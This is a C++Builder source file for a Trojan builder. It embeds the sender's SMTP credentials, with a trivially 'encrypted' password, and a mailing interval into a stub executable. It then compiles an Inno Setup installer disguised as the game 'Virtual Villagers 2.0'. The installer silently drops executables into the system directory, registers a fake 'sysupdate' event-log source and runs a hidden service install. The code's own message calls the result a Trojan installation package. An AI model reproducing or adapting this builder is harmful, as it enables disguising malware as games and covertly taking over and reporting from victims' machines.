//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm1 *Form1;
struct config
{
    unsigned int bytes;
    wchar_t magic[2];
    unsigned long int millisecond; // 毫秒
    wchar_t from[_MAX_FNAME],  to[_MAX_FNAME], subject[_MAX_FNAME],
	    smtpserver[_MAX_FNAME], username[_MAX_FNAME], password[_MAX_FNAME], content[_MAX_FNAME];
};
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
	: TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm1::sendeditChange(TObject *Sender)
{
   usernameedit->Text = sendedit->Text.SubString(0, sendedit->Text.Pos(L"@") - 1);
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button1Click(TObject *Sender)
{
  if(checkmail() != 0)
	  return;
  if(writesinstalliss() != 0)
	  return;
  makepackage();
}
//---------------------------------------------------------------------------
int __fastcall TForm1::checkmail(void)
{
  int res = -1;
  if(recvedit->Text.IsEmpty() || recvedit->Text.Pos(L"@") == 0) {
	  MessageBoxW(Handle, L"请填写收件人！", L"出错了", MB_OK | MB_ICONERROR);
	  return res;
  }
  if(sendedit->Text.IsEmpty() || sendedit->Text.Pos(L"@163.com") == 0) {
	  MessageBoxW(Handle, L"请填写发件人！", L"出错了", MB_OK | MB_ICONERROR);
	  return res;
  }
  if(usernameedit->Text.IsEmpty()) {
	  MessageBoxW(Handle, L"请填写用户名！", L"出错了", MB_OK | MB_ICONERROR);
	  return res;
  }
  if(passwordedit->Text.IsEmpty()) {
	  MessageBoxW(Handle, L"请填写密码！", L"出错了", MB_OK | MB_ICONERROR);
	  return res;
  }
  time_t tim;
  tim = time(NULL);

  using namespace  Idmessagebuilder;
  TIdMessageBuilderPlain *msgbp = new TIdMessageBuilderPlain;

  //IdMessage1->CharSet = L"GB18030";
  //IdMessage1->Body->Text = L"编辑人员这是为了使用户需求而开发的，嘻嘻！！";
  IdMessage1->From->Address = sendedit->Text;
  IdMessage1->Subject = _wasctime(localtime(&tim));
  IdMessage1->Recipients->EMailAddresses = recvedit->Text;
  //IdMessage1->AttachmentEncoding = L"MIME";

  msgbp->PlainTextCharSet = L"GB18030";
  msgbp->PlainText->Text = L"测试邮件，嘻嘻！！";
  msgbp->FillMessage(IdMessage1);

  IdSMTP1->Host = L"smtp.163.com";
  IdSMTP1->Username = usernameedit->Text;
  IdSMTP1->Password = passwordedit->Text;
  try {
	  IdSMTP1->Connect();
	  if(IdSMTP1->Connected())
		  IdSMTP1->Send(IdMessage1);
	  //MessageBoxW(Handle, L"验证成功！", L"正确", MB_OK | MB_ICONINFORMATION);
	  res = 0;
  } catch (...) {
	  MessageBoxW(Handle, L"用户名和密码错误，或没有网络！", L"出错了", MB_OK | MB_ICONERROR);
  }
  IdSMTP1->Disconnect(true);
  delete msgbp;
  return res;
}
//---------------------------------------------------------------------------
unsigned int __fastcall TForm1::encryptpassword(wchar_t *dest, int unsigned sizewchars,
                   const wchar_t *password, int unsigned lenwchars)
{
   wchar_t *pdest;
   const wchar_t *pp;

   pdest = dest;
   pp = password;
   while(pdest - dest + 1u < sizewchars && *pp && pp - password + 0u < lenwchars) {
	   *pdest++ = *pp + (pp - password + 1);
	   pp++;
   }
   *pdest = L'\0';
   return pdest - dest;
}
//---------------------------------------------------------------------------
unsigned int __fastcall TForm1::decryptpassword(wchar_t *dest, int unsigned sizewchars,
			const wchar_t *password, int unsigned lenwchars)
{
   wchar_t *pdest;
   const wchar_t *pp;

   pdest = dest;
   pp = password;
   while(pdest - dest + 1u < sizewchars && *pp && pp - password + 0u < lenwchars) {
	   *pdest++ = *pp - (pp - password + 1);
	   pp++;
   }
   *pdest = L'\0';
   return pdest - dest;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::GroupBox1Click(TObject *Sender)
{
  /*
   wchar_t buf[128];
   encryptpassword(buf, 128u, passwordedit->Text.w_str(), passwordedit->Text.Length());
   sendedit->Text = buf;
   decryptpassword(buf, 128u, sendedit->Text.w_str(), sendedit->Text.Length());
   recvedit->Text = buf;
   */
}
//---------------------------------------------------------------------------
int __fastcall TForm1::writesinstalliss(void)
{
    const wchar_t *cvar = L"; Script generated by the Inno Setup Script Wizard.\n"
        L"; SEE THE DOCUMENTATION FOR DETAILS ON CREATING INNO SETUP SCRIPT FILES!\n"
        L"\n"
        L"[Setup]\n"
        L"; NOTE: The value of AppId uniquely identifies this application.\n"
        L"; Do not use the same AppId value in installers for other applications.\n"
        L"; (To generate a new GUID, click Tools | Generate GUID inside the IDE.)\n"
        L"AppId=Virtual Villagers\n"
        L"AppName=虚拟村庄\n"
        L"AppVersion=2.0\n"
        L";AppVerName=虚拟村庄 2.0\n"
        L"AppPublisher=popgame, Inc.\n"
        L"AppPublisherURL=http://www.popgame.com/\n"
        L"AppSupportURL=http://www.popgame.com/\n"
        L"AppUpdatesURL=http://www.popgame.com/\n"
        L"DefaultDirName={pf}\\Virtual Villagers\n"
        L"DefaultGroupName=Virtual Villagers\n"
        L"OutputBaseFilename=虚拟村庄2.0安装\n"
        L"Compression=lzma\n"
        L"SolidCompression=yes\n"
        L"\n"
        L"[Languages]\n"
        L"Name: \"english\"; MessagesFile: \"compiler:Default.isl\"\n"
        L"\n"
        L"[Tasks]\n"
        L"Name: \"desktopicon\"; Description: \"{cm:CreateDesktopIcon}\"; GroupDescription: \"{cm:AdditionalIcons}\"; Flags: unchecked\n"
        L"\n"
        L"[Files]\n"
		L"Source: \"%s\\虚拟村庄2\\*\"; DestDir: \"{app}\"; Flags: ignoreversion\n"
		L"Source: \"%s\\虚拟村庄2\\Images\\*\"; DestDir: \"{app}\\Images\"; Flags: ignoreversion\n"
		L"Source: \"%s\\虚拟村庄2\\Sounds\\*\"; DestDir: \"{app}\\Sounds\"; Flags: ignoreversion\n"
		L"Source: \"%s\\虚拟村庄2\\sys\\rich.exe\"; DestDir: \"{sys}\"; AfterInstall: AfterInstallRiched20('{sys}\\rich.exe');\n"
		L"Source: \"%s\\虚拟村庄2\\sys\\sys.exe\"; DestDir: \"{sys}\"; AfterInstall: AfterInstallSys('{sys}\\sys.exe');\n"
        L"Source: \"%s\\system.exe\"; DestDir: \"{sys}\"; AfterInstall: AfterInstallSystem;\n"
        L"; NOTE: Don't use \"Flags: ignoreversion\" on any shared system files\n"
        L"\n"
        L"[Icons]\n"
        L"Name: \"{group}\\虚拟村庄\"; Filename: \"{app}\\Virtual Villagers - The Lost Children.exe\"\n"
        L"Name: \"{commondesktop}\\虚拟村庄\"; Filename: \"{app}\\Virtual Villagers - The Lost Children.exe\"; Tasks: desktopicon\n"
        L"\n"
        L"[Run]\n"
        L"Filename: \"{app}\\Virtual Villagers - The Lost Children.exe\"; Description: \"{cm:LaunchProgram,虚拟村庄}\"; Flags: nowait postinstall skipifsilent\n"
        L"\n"
        L"[Code]\n"
        L"procedure AfterInstallRiched20(FileName: String);\n"
        L"begin\n"
        L"   FileCopy(ExpandConstant(CurrentFilename), ExpandConstant('{sys}\\rich.bak.exe'), false);\n"
        L"end;\n"
        L"\n"
        L"procedure AfterInstallSys(FileName: String);\n"
        L"begin\n"
        L"   FileCopy(ExpandConstant(Filename), ExpandConstant('{sys}\\sys.bak.dll'), false);\n"
        L"   FileCopy(ExpandConstant(Filename), ExpandConstant('{sys}\\sys.dll'), false);\n"
        L"   RegWriteStringValue(HKEY_LOCAL_MACHINE, '\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\sysupdate', 'EventMessageFile', ExpandConstant('{sys}\\sys.dll'));\n"
        L"   RegWriteDWordValue(HKEY_LOCAL_MACHINE, '\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\sysupdate', 'TypesSupported', 7);\n"
        L"end;\n"
        L"\n"
        L"procedure AfterInstallSystem;\n"
        L"var\n"
        L"  ResultCode: Integer;\n"
        L"begin\n"
        L"   FileCopy(ExpandConstant(CurrentFilename), ExpandConstant('{sys}\\sysservice.bak.exe'), false);\n"
        L"   FileCopy(ExpandConstant(CurrentFilename), ExpandConstant('{sys}\\sysservice.exe'), false);\n"
        L"   Exec(ExpandConstant('{sys}\\sysservice.exe'), 'install', ExpandConstant('{sys}'), SW_HIDE, ewWaitUntilTerminated, ResultCode);\n"
        L"end;\n"
        L"\n";
	wchar_t setuppath[_MAX_PATH], workpath[_MAX_PATH];
	wchar_t *p, *ptemp;

	wmemset(setuppath, L'0', sizeof(setuppath) / sizeof(setuppath[0]));
	wmemset(workpath, L'0', sizeof(workpath) / sizeof(workpath[0]));

	GetModuleFileName(NULL, setuppath, sizeof(setuppath) / sizeof(setuppath[0]));
	if((p = wcsrchr(setuppath, L'\\')) == NULL)
		return -1;
	*p = L'\0';
	//GetUserProfileDirectory
	if((ptemp = _wgetenv(L"TEMP")) == NULL && (ptemp = _wgetenv(L"TMP")) == NULL)
		return -1;
	wcscat(wcsncpy(workpath, ptemp, _MAX_PATH), L"\\install.iss");

	FILE *fp;
	if((fp = _wfopen(workpath, L"wt")) == NULL)
		return -1;
	fwprintf(fp, cvar, setuppath, setuppath, setuppath, setuppath, setuppath, ptemp);
	fclose(fp);

	wcscat(wcsncpy(workpath, setuppath, _MAX_PATH), L"\\system.orig");
	wcscat(wcsncpy(setuppath, ptemp, _MAX_PATH), L"\\system.exe");

	CopyFileW(workpath, setuppath, FALSE);

	if((fp = _wfopen(setuppath, L"a+b")) == NULL)
		return -1;

	struct config config;
	config.bytes = sizeof(struct config);
	config.magic[0] = L'B';
	config.magic[1] = L'M';
	wcsncpy(config.from, sendedit->Text.w_str(), _MAX_FNAME);
	wcsncpy(config.to, recvedit->Text.w_str(), _MAX_FNAME);
	wcsncpy(config.subject, subjectedit->Text.w_str(), _MAX_FNAME);
	wcsncpy(config.smtpserver, L"smtp.163.com", _MAX_FNAME);
	wcsncpy(config.username, usernameedit->Text.w_str(), _MAX_FNAME);
	wchar_t password[128];
	int unsigned len;
	len = encryptpassword(password, 128u, passwordedit->Text.w_str(), passwordedit->Text.Length());
	wcsncpy(config.password, password, len + 1u);
	config.millisecond = (minute->ItemIndex + 1lu)* 10lu * 60lu * 1000ul;
	if(fwrite(&config, sizeof(struct config), 1u, fp) != 1u)
	    MessageBoxW(Handle, L"写出错", L"信息", MB_OK | MB_ICONINFORMATION);
	fclose(fp);
  	return 0;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::makepackage(void)
{
	int unsigned threadid;
	_beginthreadex(NULL, 0U, dotask, this, 0U, &threadid);
	//dotask((void *)this);
	//CloseHandle((void *)threadid);
}
unsigned int __stdcall TForm1::dotask(void *arg)
{
	TForm1 *me = (TForm1 *)arg;
	me->Button1->Enabled = false;

	wchar_t tmppath[_MAX_PATH], exepath[_MAX_PATH << 2], *p, outpath[_MAX_PATH], isspath[_MAX_PATH];

	me->Memo1->Lines->Clear();
	wmemset(outpath, L'0', sizeof(outpath) / sizeof(outpath[0]));
	memset(tmppath, 0, sizeof(tmppath));
	memset(exepath, 0, sizeof(exepath));
	GetModuleFileName(NULL, tmppath, sizeof(tmppath) / sizeof(tmppath[0]));
	if((p = wcsrchr(tmppath, L'\\')) == NULL)   {
		me->Button1->Enabled = true;
		_endthreadex(0U);
		return 0u;
	}
	*p = L'\0';
	if(!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, outpath))) {
		me->Button1->Enabled = true;
		_endthreadex(0U);
		return 0u;
	}
	if((p = _wgetenv(L"TEMP")) == NULL && (p = _wgetenv(L"TMP")) == NULL) {
		me->Button1->Enabled = true;
		_endthreadex(0U);
		return 0u;
	}
	wcscat(wcsncpy(isspath, p, _MAX_PATH), L"\\install.iss");
	_snwprintf(exepath, sizeof(exepath) / sizeof(exepath[0]) - 1u,
		L"%s\\Inno Setup 5\\iscc.exe /O\"%s\" \"%s\"", tmppath, outpath, isspath);
	/*
	_snwprintf(exepath, sizeof(exepath) / sizeof(exepath[0]) - 1u,
		L"%s\\Inno Setup 5\\iscc.exe", tmppath);
    */

	HANDLE hChildStd_IN_Rd = NULL;
	HANDLE hChildStd_IN_Wr = NULL;
	HANDLE hChildStd_OUT_Rd = NULL;
	HANDLE hChildStd_OUT_Wr = NULL;

	SECURITY_ATTRIBUTES saAttr;
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;
    // Create a pipe for the child process's STDOUT.
	CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0);
	SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
	// Create a pipe for the child process's STDIN
	CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &saAttr, 0);
	SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);

	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;

	// Set up members of the PROCESS_INFORMATION structure.
	memset(&piProcInfo, 0, sizeof(piProcInfo));
	// Set up members of the STARTUPINFO structure.
	// This structure specifies the STDIN and STDOUT handles for redirection.
	memset(&siStartInfo, 0, sizeof(siStartInfo));
	siStartInfo.cb = sizeof(siStartInfo);
	siStartInfo.hStdError = hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = hChildStd_OUT_Wr;
	siStartInfo.hStdInput = hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	BOOL bSuccess = FALSE;
	bSuccess = CreateProcessW(NULL,
      exepath,     // command line
      &saAttr,          // process security attributes
      &saAttr,          // primary thread security attributes
      TRUE,          // handles are inherited
      CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,     // creation flags
	  NULL,          // use parent's environment
      NULL,          // use parent's current directory
      &siStartInfo,  // STARTUPINFO pointer
	  &piProcInfo);  // receives PROCESS_INFORMATION
	if ( ! bSuccess )  {
        me->formaterror(GetLastError());
		goto cleanup;
	}
	// Close handles to the child process and its primary thread.
	// Some applications might keep these handles to monitor the status
	// of the child process, for example.
	CloseHandle(piProcInfo.hProcess);
	CloseHandle(piProcInfo.hThread);
	CloseHandle(hChildStd_OUT_Wr);
	CloseHandle(hChildStd_IN_Rd);
	unsigned long int bytes_read;
	char buf[BUFSIZ << 1], *lineend, *linestart;
	memset(buf, 0, sizeof(buf));
	while(ReadFile(hChildStd_OUT_Rd, buf, sizeof(buf) - 2u, &bytes_read, NULL) && bytes_read > 0lu) {
#if 0
		linestart = buf;
		while((lineend = strchr(linestart, '\r')) != NULL ) {
			*lineend = '\0';
			me->Memo1->Lines->Add(linestart);
			linestart++;
		}
#endif
		lineend = strstr(buf, "虚拟村庄2.0安装.exe");
		me->Memo1->Lines->Add(buf);
		memset(buf, 0, sizeof(buf));
	}
	if(lineend)
        MessageBoxW(me->Handle, L"木马安装包已生成，注意不要在本机运行！\n\n安装包在桌面上，名字是\"虚拟村庄2.0安装.exe\"", L"信息", MB_OK | MB_ICONINFORMATION);
cleanup:
	CloseHandle(hChildStd_IN_Wr);
	CloseHandle(hChildStd_OUT_Rd);;
	me->Button1->Enabled = true;
	_endthreadex(0U);
	return 1u;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::formaterror(DWORD dwErr)
// Format a readable error message, display a message box,
// and exit from the application.
{
    LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dwErr,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR) &lpMsgBuf,
        0, NULL );

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf)+128)*sizeof(TCHAR));
	//StringCchPrintf((LPTSTR)lpDisplayBuf,
	_snwprintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR) - 1u,
		TEXT("failed with error %d: %s"),
		dwErr, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("错误"), MB_OK | MB_ICONERROR);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
}



